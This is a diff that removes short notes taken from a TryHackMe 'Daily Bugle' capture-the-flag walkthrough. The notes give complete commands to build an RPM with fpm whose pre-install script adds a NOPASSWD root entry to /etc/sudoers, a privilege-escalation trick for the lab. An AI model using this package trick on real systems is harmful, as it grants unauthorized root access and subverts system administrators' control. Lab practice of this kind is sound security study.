@@ -1,5 +1,0 @@
-From THM Daily Bugle (https://medium.com/azkrath/tryhackme-walkthrough-daily-bugle-1933e114d91c)
-
-apt-get install rpm
-echo 'echo "jjameson ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh  (jjameson is user name)
-fpm -n root -s dir -t rpm -a all --before-install sudo.sh . Created package {:path=>"root.noarch.rpm"}
